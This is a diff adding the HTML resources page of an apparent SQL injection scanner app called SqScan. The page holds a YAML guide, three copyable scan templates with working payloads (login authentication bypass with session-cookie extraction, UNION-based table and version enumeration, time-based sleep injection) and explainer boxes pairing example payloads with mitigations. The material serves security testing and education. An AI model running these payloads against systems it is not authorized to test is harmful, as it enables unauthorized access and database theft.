@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Resources - SqScan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const logoutLink = document.getElementById("logout-confirmation");
+  if (logoutLink) {
+    logoutLink.addEventListener("click", function(event) {
+      event.preventDefault(); // Stop default navigation
+      const confirmLogout = confirm("Are you sure you want to log out?");
+      if (confirmLogout) {
+        window.location.href = logoutLink.href; // Proceed to logout
+      }
+    });
+  }
+});
+
+// copy helper
+function copyText(id) {
+  const el = document.getElementById(id);
+  if (!el) return alert('Template not found');
+  const text = el.textContent || el.innerText || '';
+  if (!text) { alert('Template is empty'); return; }
+  navigator.clipboard?.writeText(text).then(() => {
+    // small non-blocking feedback
+    const btn = document.querySelector('[data-copy-target="' + id + '"]');
+    if (btn) {
+      const orig = btn.textContent;
+      btn.textContent = 'Copied';
+      setTimeout(()=> btn.textContent = orig, 1200);
+    } else {
+      alert('Copied to clipboard');
+    }
+  }).catch(() => {
+    // fallback
+    const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); alert('Copied to clipboard'); } catch (e) { alert('Copy failed'); }
+    ta.remove();
+  });
+}
+</script>
+
+<body>
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <!-- Logo -->
+        <img src="{{ url_for('static', filename='images/logo_colour.png') }}" alt="SqScan Logo" class="side_logo">
+        <h2>Welcome, {{ user['name'] }}</h2>
+        <a href="{{ url_for('dashboard') }}">Dashboard</a>
+        <a href="{{ url_for('scan') }}">Scan</a>
+        <a href="{{ url_for('template') }}">Template</a>
+        <a href="{{ url_for('account') }}">Account</a>
+        <a href="{{ url_for('info') }}">Resources</a>
+        <a href="{{ url_for('logout') }}" id="logout-confirmation">Log out</a>
+    </div>
+
+<div class="form-container4">
+    <div class="info-header">
+      <h2>SQLi & Template Guide</h2>
+      <p class="muted">Quick reference: YAML | Error | Time-based | Boolean-based | Union-based</p>
+    </div>
+
+    <!-- YAML template explanation -->
+    <section class="info-section">
+      <h3>What is a YAML template?</h3>
+      <p>
+        A YAML template is a reusable YAML file containing shareable content, logic, or parameters designed to be incorporated into other YAML files,
+        typically for configuration or automation purposes. This approach promotes code reusability, improves maintainability, and ensures consistency
+        across multiple configurations or pipelines.
+      </p>
+    </section><br>
+
+    <!-- YAML Beginner Guide -->
+    <section class="info-section yaml-guide">
+      <h3>YAML Quick Guide for Beginners</h3>
+      <p class="muted">Learn how to read, edit, and create YAML templates for SqScan.</p>
+
+      <h4>1. YAML Basics</h4>
+      <ul>
+        <li>Use <strong>2 spaces</strong> for indentation (never Tabs)</li>
+        <li>Format: <strong>key: value</strong></li>
+        <li>Lists use <code>-</code></li>
+        <li>Nested structures are indented:</li>
+      </ul>
+      <pre>
+info:
+  name: Example
+  tags:
+    - sqli
+    - login
+      </pre>
+
+      <h4>2. Common Mistakes to Avoid</h4>
+      <ul>
+        <li>Using Tabs instead of spaces</li>
+        <li>Missing a colon <code>:</code></li>
+        <li>Incorrect indentation</li>
+        <li>Forgetting quotes around values with special characters</li>
+      </ul>
+
+      <h4>3. Editing Templates</h4>
+      <ul>
+        <li>Replace <code>{{BaseURL}}</code> with your target endpoint</li>
+        <li>Add or remove payloads under <code>payloads:</code></li>
+        <li>Customize matchers under <code>matchers:</code> to detect specific responses</li>
+        <li>Use a unique <code>id:</code> for your template</li>
+        <li>Save the file as <code>.yaml</code> before uploading</li>
+      </ul>
+
+      <h4>4. Starter Template Example</h4>
+      <pre>{% raw %}id: basic-sqli-check
+info:
+  name: Basic SQLi Test
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=' OR 1=1 -- "
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "syntax"{% endraw %}
+      </pre>
+    </section>
+
+    <!-- Templates (copy-only) -->
+    <section class="info-section templates-section">
+      <h3>Templates</h3>
+      <p class="muted">Read-only view — use the Copy button to copy YAML to clipboard.</p>
+
+      <details class="template-item">
+        <summary>SQLi - Authentication bypass</summary>
+        <div class="template-body">
+          <pre id="tmpl-sqli-auth-bypass" class="tmpl-pre">{% raw %}id: sqli-auth-bypass
+info:
+  name: SQLi - Authentication bypass
+  author: Jun Min
+  severity: critical
+  description: Detects common login bypass techniques against web login endpoints (SQL injection payloads). Attempts username/password SQLi payloads against multiple parameter names and looks for authentication indicators.
+  
+  tags:
+    - auth-bypass
+    - sqli
+    - login
+    - authentication
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:                       
+        - "username"
+        - "user"
+        - "email"
+        - "email_address"
+        - "login"
+        - "uid"
+        - "uname"
+
+      password_param:             
+        - "password"
+        - "pass"
+        - "pwd"
+        - "user_pass"
+        - "login_password"
+        - "passwd"
+
+      username:
+        - "admin"
+        - "administrator"
+        - "root"
+        - "test"
+        - "' OR '1'='1"
+        - "admin' -- "
+        - "admin'/*"
+
+      password:
+        - "' OR '1'='1"
+        - "' OR '1'='1' -- "
+        - "' OR 1=1 -- "
+        - ""
+
+    body: "{{param}}={{username}}&{{password_param}}={{password}}"
+    attack: clusterbomb
+    threads: 8
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 302
+          - 301
+
+      - type: word
+        part: body
+        words:
+          - "Dashboard"
+          - "Sign out"
+          - "sign out"
+          - "Logout"
+          - "logout"
+          - "My Account"
+        condition: or
+
+      - type: regex
+        part: header
+        regex:
+          - "(?i)set-cookie:.*(session|sessionid|PHPSESSID|php_session)"
+        condition: or
+
+
+    extractors:
+      - type: regex
+        name: status_match
+        part: header
+        regex:
+          - "(?i)^HTTP/\\d\\.\\d\\s+(301|302)"
+
+      - type: regex
+        name: cookie_match
+        part: header
+        regex:
+          - "(?i)set-cookie:.*?(PHPSESSID|session|sessionid|php_session)=([^;\\s]+)"
+
+      - type: regex
+        name: redirect_to
+        part: header
+        regex:
+          - "(?i)location:\\s*(.+)"
+
+      - type: regex
+        name: word_match
+        part: body
+        regex:
+          - "(Dashboard|Sign out|sign out|Logout|logout|My Account)"
+
+      - type: regex
+        name: welcome_user
+        part: body
+        regex:
+          - "Welcome(?: back)?[\\s,]+([A-Za-z0-9_\\- ]{2,60})"
+{% endraw %}</pre>
+          <div class="tmpl-actions">
+            <button class="btn-copy" data-copy-target="tmpl-sqli-auth-bypass" onclick="copyText('tmpl-sqli-auth-bypass')">Copy</button>
+          </div>
+        </div>
+      </details>
+
+      <details class="template-item">
+        <summary>SQLi - UNION (marker H3n4y)</summary>
+        <div class="template-body">
+          <pre id="tmpl-sqli-union-capture-h3n4y" class="tmpl-pre">{% raw %}id: sqli-union-capture-h3n4y
+info:
+  name: SQLi - UNION (marker H3n4y)
+  author: Jun Min
+  severity: high
+  description: Attempts UNION‑based payloads across columns and extracts all H3n4y(...)H3n4y markers from responses for authenticated targets.
+  
+  tags:
+    - sqli
+    - union
+    - enum
+    - mysql
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://portswigger.net/web-security/sql-injection/union-attacks
+
+requests:
+  - id: sqli-union-capture
+    method: GET
+    path:
+      - "{{BaseURL}}?{{param}}={{payload}}"
+
+    attack: clusterbomb
+    payloads:
+      param:
+        - username
+        - user
+        - name
+        - email
+        - id
+        - search
+      payload:
+        # Table name enumeration (LIMIT 1 to 6)
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 2),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 3),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 4),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 5),CHAR(72,51,110,52,121))-- -"
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 6),CHAR(72,51,110,52,121))-- -"
+        
+        # version() in multiple column positions (marker H3n4y in ASCII)
+        - "' UNION SELECT NULL,CONCAT(CHAR(72,51,110,52,121),version(),CHAR(72,51,110,52,121))-- -"
+
+    stop-at-first-match: true
+    threads: 10
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "H3n4y(.*?)H3n4y"
+      - type: regex
+        part: header
+        regex:
+          - "H3n4y(.*?)H3n4y"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "H3n4y(.*?)H3n4y"
+{% endraw %}</pre>
+          <div class="tmpl-actions">
+            <button class="btn-copy" data-copy-target="tmpl-sqli-union-capture-h3n4y" onclick="copyText('tmpl-sqli-union-capture-h3n4y')">Copy</button>
+          </div>
+        </div>
+      </details>
+
+      <details class="template-item">
+        <summary>SQLi - Time-based</summary>
+        <div class="template-body">
+          <pre id="tmpl-sqli-time-based" class="tmpl-pre">{% raw %}id: sqli-timebased
+info:
+  name: SQLi - Time-Based SQLi on Login Forms
+  author: Jun Min
+  severity: critical
+  description: Detects time-based SQL injection on login forms by injecting sleep payloads and measuring delayed server responses.
+  tags:
+    - timebased
+    - sqli
+    - login
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    
+    payloads:
+      user_param:
+        - username
+        - user
+        - email
+        - email_address
+        - login
+        - userid
+        - uid
+        - uname
+
+      pass_param:
+        - password
+        - pwd
+        - pass
+        - user_pass
+        - passwd
+        - login_password
+
+      delay_payload:
+        - "' OR SLEEP(5)-- -"
+        - "\" OR SLEEP(5)-- -"
+        - "'; WAITFOR DELAY '0:0:5'--"
+        - "'; SELECT pg_sleep(5)--"
+        - "1) OR SLEEP(5)--"
+        - "') OR SLEEP(5)-- -"
+
+      submit_param:
+        - login
+        - Login
+        - LOGIN
+
+    attack: clusterbomb
+
+    body: "{{user_param}}=test{{delay_payload}}&{{pass_param}}=abc123&submit={{submit_param}}"
+
+    threads: 6
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+
+      - type: dsl
+        name: time-delay
+        dsl:
+          - "duration >= 4.5"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        name: response_time
+        dsl:
+          - "'Response took ' + to_string(duration) + ' seconds'"
+{% endraw %}</pre>
+          <div class="tmpl-actions">
+            <button class="btn-copy" data-copy-target="tmpl-sqli-time-based" onclick="copyText('tmpl-sqli-time-based')">Copy</button>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- SQLi Types Boxes -->
+    <div class="info-grid">
+      <section class="info-section">
+        <h3>Error-based SQLi</h3>
+        <p><strong>What:</strong> The application returns database error messages that leak details (schema, column names, types).</p>
+        <p><strong>Example payload:</strong> <code>' OR 1=1 --</code></p>
+        <p><strong>Mitigation:</strong> Use parameterized queries, disable verbose DB errors, and centralize error handling.</p>
+      </section>
+
+      <section class="info-section">
+        <h3>Time-based (Blind) SQLi</h3>
+        <p><strong>What:</strong> No direct DB output; attacker infers results by forcing delays.</p>
+        <p><strong>Example payload:</strong> <code>' AND IF(..., sleep(5), sleep(0)) --</code></p>
+        <p><strong>Mitigation:</strong> Parameterize queries, restrict DB privileges, and monitor high-latency probes.</p>
+      </section>
+
+      <section class="info-section">
+        <h3>Boolean-based (Blind) SQLi</h3>
+        <p><strong>What:</strong> No errors or visible DB output; attacker observes page changes based on true/false conditions.</p>
+        <p><strong>Example payload:</strong> <code>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --</code></p>
+        <p><strong>Mitigation:</strong> Prepared statements, input validation, output encoding, monitoring.</p>
+      </section>
+
+      <section class="info-section">
+        <h3>Union-based SQLi</h3>
+        <p><strong>What:</strong> Uses <code>UNION SELECT</code> to append attacker-controlled rows to results.</p>
+        <p><strong>Example payload:</strong> <code>' UNION SELECT username, password FROM users --</code></p>
+        <p><strong>Mitigation:</strong> Use parameterized queries, enforce output encoding, least-privilege DB accounts.</p>
+      </section>
+    </div>
+
+    <!-- Quick Tips & Contact -->
+    <section class="info-section">
+      <h3>Quick detection tips & best practices</h3>
+      <ul>
+        <li>Test with quotes, boolean checks, and delay payloads (authorized/test environments only).</li>
+        <li>Check logs for DB errors and suspicious SQL meta-characters.</li>
+        <li>Implement rate-limiting and WAF rules to reduce automated probing.</li>
+      </ul>
+      <h4>Best practices</h4>
+      <ol>
+        <li>Use parameterized/prepared statements or ORM parameterization.</li>
+        <li>Validate/whitelist user input; encode outputs.</li>
+        <li>Grant minimum necessary DB permissions.</li>
+        <li>Disable verbose DB errors in production; centralize logging and alerts.</li>
+      </ol>
+      <p class="note">Note: Example payloads are simplified for educational/testing purposes only.</p>
+      <p class="contact">Contact: <a href="mailto:henryyy0602@gmail.com">henryyy0602@gmail.com</a></p>
+    </section>
+</div>
+
+</body>
+</html>
